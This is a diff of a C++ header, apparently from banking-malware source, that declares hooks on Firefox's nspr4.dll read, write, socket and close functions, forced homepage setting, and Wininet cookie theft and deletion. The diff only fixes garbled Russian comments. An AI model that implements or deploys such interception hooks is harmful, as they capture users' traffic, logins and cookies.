@@ -1,5 +1,5 @@
 /*
-  РџРµСЂРµС…РІР°С‚ nspr4.dll
+  Перехват nspr4.dll
 */
 #pragma once
 
@@ -7,53 +7,53 @@
 namespace Nspr4Hook
 {
   /*
-    РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Инициализация.
 
-    IN homePage - РїСЂРёРЅСѓРґРёС‚РµР»СЊРЅР°СЏ СѓСЃС‚Р°РЅРѕРІРєР° РґРѕРјР°С€РЅРµР№ СЃС‚СЂР°РЅРёС†С‹, РµСЃР»Рё NULL РёР»Рё [0]=0, С‚Рѕ РЅРµ РїСЂРёРјРµРЅСЏРµС‚СЃСЏ.
+    IN homePage - принудительная установка домашней страницы, если NULL или [0]=0, то не применяется.
   */
   void init(const LPWSTR homePage);
 
   /*
-    Р”РµРёРЅРёС†РёР°Р»РёР·Р°С†РёСЏ.
+    Деинициализация.
   */
   void uninit(void);
 
   /*
-    РџРѕР»СѓС‡РµРЅРёРµ РєСѓРєРѕРІ Wininet.
+    Получение куков Wininet.
   */
   void _getCookies(void);
 
   /*
-    РЈРґР°Р»РµРЅРёРµ РєСѓРєРѕРІ Wininet.
+    Удаление куков Wininet.
   */
   void _removeCookies(void);
 
   /*
-    РЈСЃС‚Р°РЅРѕРІРєР° Р°РґРµСЂСЃРѕРІ РѕСЂРёРіРёРЅР°Р»СЊРЅС‹С… С„СѓРЅРєС†РёР№. Р¤СѓРЅРєС†РёСЏ РґРѕР»Р¶РЅР° РІС‹Р·С‹РІР°С‚СЊСЃСЏ РІ РїСЂРѕС†РµСЃСЃРµ РћР”РРќ Р РђР—.
+    Установка адерсов оригинальных функций. Функция должна вызываться в процессе ОДИН РАЗ.
 
-    IN module       - РјРѕРґСѓР»СЊ.
-    IN readAddress  - Р°РґСЂРµСЃ РѕСЂРёРіРёРЅР°Р»СЊРЅРѕР№ PR_Read.
-    IN writeAddress - Р°РґСЂРµСЃ РѕСЂРёРіРёРЅР°Р»СЊРЅРѕР№ PR_Write.
+    IN module       - модуль.
+    IN readAddress  - адрес оригинальной PR_Read.
+    IN writeAddress - адрес оригинальной PR_Write.
   */
   void updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void *close, void *readAddress, void *writeAddress);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє PR_OpenTCPSocket.
+    Перехватчик PR_OpenTCPSocket.
   */
   void *__cdecl hookerPrOpenTcpSocket(int af);
   
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє PR_Read.
+    Перехватчик PR_Read.
   */
   int __cdecl hookerPrClose(void *fd);
 
   /*
-    РџРµСЂРµС…РІР°С‚С‡РёРє PR_Read.
+    Перехватчик PR_Read.
   */
   __int32 __cdecl hookerPrRead(void *fd, void *buf, __int32 amount);
   
-  /*Р’В Р’В Р’В Р’В Interceptor PR_Write.
-Р’В Р’В */
+  /*В В В В Interceptor PR_Write.
+В В */
   __int32 __cdecl hookerPrWrite(void *fd, const void *buf, __int32 amount);
 };
 #endif
